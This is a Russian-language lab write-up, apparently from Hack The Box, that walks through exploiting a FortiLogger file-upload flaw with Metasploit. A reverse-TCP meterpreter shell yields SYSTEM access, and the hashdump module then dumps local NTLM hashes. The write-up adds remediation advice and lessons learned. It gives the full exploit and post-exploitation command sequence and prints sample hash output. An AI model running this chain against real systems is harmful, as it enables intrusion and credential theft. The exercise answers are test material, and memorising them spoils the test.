# Metasploit Exploitation — Metropolitan: FortiLogger RCE (Arbitrary File Upload)

## Задача
Вопрос 1: найти существующий эксплойт в Metasploit Framework (MSF) для получения командной оболочки на целевой машине и определить, какое имя пользователя было получено.
Вопрос 2: получить NTLM-хеш пароля пользователя `htb-student`.

## 1. Recon (Nmap через msfconsole)

```
sudo msfdb run
db_nmap -A --top-ports 60 -T5 10.129.173.75
```

Результат:

| Порт | Сервис | Версия |
|------|--------|--------|
| 135/tcp | msrpc | Microsoft Windows RPC |
| 139/tcp | netbios-ssn | Microsoft Windows netbios-ssn |
| 445/tcp | microsoft-ds | — |
| 3389/tcp | ms-wbt-server | RDP, hostname WIN-51BJ97BCIPV |
| 5000/tcp | http | Microsoft IIS 10.0 — **FortiLogger | Log and Report System** |

**Ключевое наблюдение:** порт 5000 с нестандартным HTTP-сервисом — сразу приоритетная цель. `http-title` в выводе Nmap прямо называет продукт (FortiLogger), что резко сужает область поиска эксплойта — вместо общего анализа IIS ищем известные CVE именно для этого стороннего приложения, развёрнутого поверх IIS.

## 2. Поиск эксплойта в MSF

```
search FortiLogger
```

Единственный результат: `exploit/windows/http/fortilogger_arbitrary_fileupload` (2021-02-26, rank: normal, check: Yes).

**Класс уязвимости — Arbitrary File Upload.** Приложение позволяет загрузить файл без должной проверки типа/расширения/содержимого. Сам по себе upload — это ещё не RCE: чтобы файл превратился в код, исполняемый на сервере, должны совпасть два условия — (1) загруженный файл сохраняется в директории, из которой веб-сервер способен исполнять код (например, внутри веб-корня с правами на выполнение `.aspx`/`.php`), и (2) сервер не проверяет реальное содержимое/тип файла, а доверяет расширению или клиентским данным. FortiLogger не валидировал загружаемый контент, что позволило подсунуть ASPX-файл с payload'ом meterpreter напрямую в исполняемую директорию IIS.

## 3. Настройка и запуск эксплойта

```
use 0
```

При выборе модуля MSF автоматически предложил payload `windows/meterpreter/reverse_tcp` (осмысленный дефолт для Windows-целей).

```
show options
set RHOSTS 10.129.173.75
set LHOST tun0
exploit
```

Вывод:

```
[+] The target is vulnerable. FortiLogger version 4.4.2.2
[+] Payload has been uploaded
[*] Executing payload...
[*] Meterpreter session 1 opened
```

## 4. Проверка полученного доступа

```
meterpreter > shell
whoami
```

Результат: `nt authority\system`.

**Почему сразу SYSTEM, а не обычный пользователь.** Веб-сервис IIS в этой конфигурации был запущен как служба (Windows Service) с использованием встроенной учётной записи `NT AUTHORITY\SYSTEM` (либо `NETWORK SERVICE` с последующим наследованием, но конкретно тут — SYSTEM), а не под ограниченной учётной записью веб-приложения. Поэтому shell, полученный через эксплойт уязвимости в самом приложении, автоматически наследует привилегии процесса-носителя — то есть максимальные. Это нетипично для правильно настроенного продакшена (принцип наименьших привилегий требует запуска веб-служб под выделенной низкопривилегированной учёткой), но частая находка в учебных/тестовых средах и, к сожалению, в реальных недосмотренных инсталляциях.

**Ответ на вопрос 1:** `nt authority\system` *(имя пользователя, полученное через shell)*.

## 5. Post-exploitation: дамп NTLM-хешей

```
meterpreter > background
search hashdump post windows
```

Из отфильтрованного списка выбираем модуль `post/windows/gather/hashdump` (Windows Gather Local User Account Password Hashes через реестр).

```
use post/windows/gather/hashdump
set SESSION 1
run
```

Результат (пример из вывода):

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:bdaffbfe64f1fc646a3353be1c2c3c99:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb-student:1002:aad3b435b51404eeaad3b435b51404ee:FAKE_NTLM_HASH_0000111122223333:::
```

**Формат строки SAM:** `username:RID:LM-hash:NTLM-hash:::`. Значение `aad3b435b51404eeaad3b435b51404ee`, повторяющееся у всех пользователей — это **не реальный хеш пароля**, а константа, которую Windows подставляет, когда LM-хеширование отключено (что является нормой начиная с Windows Vista/Server 2008 и выше — LM считается криптографически слабым и давно deprecated). Она означает "пустой/неиспользуемый LM-хеш", а не то, что у всех пользователей одинаковый или пустой пароль. Реальный материал для атаки (передача хеша, offline-брутфорс) — это именно NTLM-часть, четвёртое поле.

**Ответ на вопрос 2:** NTLM-хеш пользователя `htb-student` — `FAKE_NTLM_HASH_0000111122223333` *(заменено на нереальное значение)*.

## Remediation

- Валидировать содержимое загружаемых файлов (magic bytes / MIME-проверка на сервере, а не по расширению), хранить загрузки вне исполняемых директорий веб-сервера, отключать выполнение скриптов в каталоге uploads.
- Обновить/патчить FortiLogger до версии без данной уязвимости или заменить продукт, если патч недоступен (для старого, снятого с поддержки ПО).
- Запускать веб-службы IIS под выделенной низкопривилегированной учётной записью (Application Pool Identity с ограниченными правами), а не как SYSTEM.
- Отключить LM-хеширование там, где оно ещё активно (в современных Windows это дефолт, но стоит проверять через `NoLMHash` в реестре/групповых политиках).
- Мониторить создание новых процессов IIS worker'ами (детект аномального поведения через EDR/Sysmon) — характерный признак file-upload RCE в проде.

## Lessons learned

- Nmap может напрямую раскрыть название стороннего продукта через `http-title`/баннеры — это резко ускоряет поиск публичного эксплойта по сравнению с попытками угадывать уязвимости "вслепую" по версии платформы (IIS).
- Arbitrary File Upload — это не автоматически RCE; RCE получается только когда есть путь исполнения загруженного файла сервером. Полезно всегда проверять, куда физически попадает файл и что с ним делает сервер дальше.
- SYSTEM-права "из коробки" после эксплойта — сигнал плохой архитектуры прав в целевой системе (веб-служба не должна работать с такими привилегиями), а не только "успех атакующего".
- Значение `aad3b435b51404eeaad3b435b51404ee` в NTLM-дампе — не пароль и не индикатор компрометации сам по себе, это стандартная заглушка для отсутствующего LM-хеша. Важно не путать её с реальным материалом для атаки.
